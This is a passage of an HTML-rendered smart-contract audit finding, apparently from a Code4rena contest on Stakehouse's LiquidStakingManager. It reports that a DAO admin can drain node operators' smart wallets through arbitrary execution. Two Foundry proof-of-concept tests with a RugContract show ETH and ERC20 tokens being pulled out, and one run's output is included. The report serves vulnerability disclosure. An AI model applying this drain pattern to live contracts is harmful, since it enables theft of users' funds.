class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsSignatures</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_eoaRepresentative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>the smart wallet created in the smart contract custody the 4 ETH.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// create new wallet owned by liquid staking manager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createWallet</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">SmartWalletCreated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// transfer ETH to smart wallet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">result</span><span class=\"mtk1\">,) = </span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">result</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Transfer failed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WalletCredited</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>but  Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.</p>\n<p><strong>As shown in POC:</strong></p>\n<p>first we add this smart contract in LiquidStakingManager.t.sol</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">RugContract</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">receiveFund</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MockToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">()</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;A&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;B&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong>We add the two POC,</strong></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35</a></p>\n<p>the first POC shows the admin can steal the ETH from the smart contract via arbrary execution.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testDaoRugFund_Pull_ETH_POC</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">21312</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk8\">&quot;publicKeys&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signature</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">signature</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk8\">&quot;signature&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">RugContract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rug</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">RugContract</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// user spends 4 ehter and register the key to become the public operator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">registerBLSPublicKeys</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">signature</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">smartWalletOfNodeRunner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;wallet ETH balance for user after registering&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// dao admin rug the user by withdraw the ETH via arbitrary execution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">RugContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">receiveFund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">executeAsSmartWallet</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">user</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rug</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;wallet ETH balance for user after DAO admin rugging&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>We run the test:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">forge</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> -</span><span class=\"mtk12\">vv</span><span class=\"mtk1\"> --</span><span class=\"mtk12\">match</span><span class=\"mtk1\"> </span><span class=\"mtk12\">testDaoRugFund_Pull_ETH_POC</span></span></span></code></pre>\n<p>the result is</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Running</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\">/</span><span class=\"mtk12\">foundry</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LiquidStakingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">LiquidStakingManagerTests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[</span><span class=\"mtk12\">PASS</span><span class=\"mtk1\">] </span><span class=\"mtk11\">testDaoRugFund_Pull_ETH_POC</span><span class=\"mtk1\">() (</span><span class=\"mtk12\">gas</span><span class=\"mtk1\">: </span><span class=\"mtk7\">353826</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Logs:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  wallet ETH balance for user after registering</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  4000000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  wallet ETH balance for user after DAO admin rugging</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Test result: ok. 1 passed; 0 failed; finished in 13.63ms</span></span></span></code></pre>\n<p>the second POC shows the admin can steal the ERC20 token from the smart contract via arbrary execution.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testDaoRugFund_Pull_ERC20_Token_POC</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">21312</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk8\">&quot;publicKeys&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signature</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">signature</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk8\">&quot;signature&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">RugContract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rug</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">RugContract</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">registerBLSPublicKeys</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">signature</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">smartWalletOfNodeRunner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MockToken</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;wallet ERC20 token balance for user after registering&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\">.</span><span class=\"mtk12\">transfer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rug</span><span class=\"mtk1\">), </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">executeAsSmartWallet</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">user</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;wallet ERC20 token balance for dao rugging&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>We run the test:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" 